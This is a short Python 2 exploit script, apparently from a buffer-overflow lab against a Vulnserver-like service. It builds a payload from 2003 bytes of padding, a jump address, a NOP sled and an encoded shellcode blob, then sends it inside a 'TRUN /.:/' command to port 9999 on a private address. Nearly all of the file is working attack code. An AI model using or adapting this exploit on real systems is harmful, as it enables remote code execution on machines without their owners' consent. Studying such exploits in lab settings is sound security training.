#!/usr/bin/python
import sys, socket

overflow = (
"\xda\xc0\xd9\x74\x24\xf4\x5a\x2b\xc9\xbd\x3f\xb9\x49\xaf\xb1"
"\x52\x31\x6a\x17\x83\xea\xfc\x03\x55\xaa\xab\x5a\x55\x24\xa9"
"\xa5\xa5\xb5\xce\x2c\x40\x84\xce\x4b\x01\xb7\xfe\x18\x47\x34"
"\x74\x4c\x73\xcf\xf8\x59\x74\x78\xb6\xbf\xbb\x79\xeb\xfc\xda"
"\xf9\xf6\xd0\x3c\xc3\x38\x25\x3d\x04\x24\xc4\x6f\xdd\x22\x7b"
"\x9f\x6a\x7e\x40\x14\x20\x6e\xc0\xc9\xf1\x91\xe1\x5c\x89\xcb"
"\x21\x5f\x5e\x60\x68\x47\x83\x4d\x22\xfc\x77\x39\xb5\xd4\x49"
"\xc2\x1a\x19\x66\x31\x62\x5e\x41\xaa\x11\x96\xb1\x57\x22\x6d"
"\xcb\x83\xa7\x75\x6b\x47\x1f\x51\x8d\x84\xc6\x12\x81\x61\x8c"
"\x7c\x86\x74\x41\xf7\xb2\xfd\x64\xd7\x32\x45\x43\xf3\x1f\x1d"
"\xea\xa2\xc5\xf0\x13\xb4\xa5\xad\xb1\xbf\x48\xb9\xcb\xe2\x04"
"\x0e\xe6\x1c\xd5\x18\x71\x6f\xe7\x87\x29\xe7\x4b\x4f\xf4\xf0"
"\xac\x7a\x40\x6e\x53\x85\xb1\xa7\x90\xd1\xe1\xdf\x31\x5a\x6a"
"\x1f\xbd\x8f\x3d\x4f\x11\x60\xfe\x3f\xd1\xd0\x96\x55\xde\x0f"
"\x86\x56\x34\x38\x2d\xad\xdf\x87\x1a\xac\x33\x60\x59\xae\x5a"
"\x2c\xd4\x48\x36\xdc\xb0\xc3\xaf\x45\x99\x9f\x4e\x89\x37\xda"
"\x51\x01\xb4\x1b\x1f\xe2\xb1\x0f\xc8\x02\x8c\x6d\x5f\x1c\x3a"
"\x19\x03\x8f\xa1\xd9\x4a\xac\x7d\x8e\x1b\x02\x74\x5a\xb6\x3d"
"\x2e\x78\x4b\xdb\x09\x38\x90\x18\x97\xc1\x55\x24\xb3\xd1\xa3"
"\xa5\xff\x85\x7b\xf0\xa9\x73\x3a\xaa\x1b\x2d\x94\x01\xf2\xb9"
"\x61\x6a\xc5\xbf\x6d\xa7\xb3\x5f\xdf\x1e\x82\x60\xd0\xf6\x02"
"\x19\x0c\x67\xec\xf0\x94\x87\x0f\xd0\xe0\x2f\x96\xb1\x48\x32"
"\x29\x6c\x8e\x4b\xaa\x84\x6f\xa8\xb2\xed\x6a\xf4\x74\x1e\x07"
"\x65\x11\x20\xb4\x86\x30")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow #This is actually in reverse; Little Endianne Format; \x90 * 32 is a NOP Sled

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.45',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()


except:
	print "Error connecting to server"
	sys.exit()
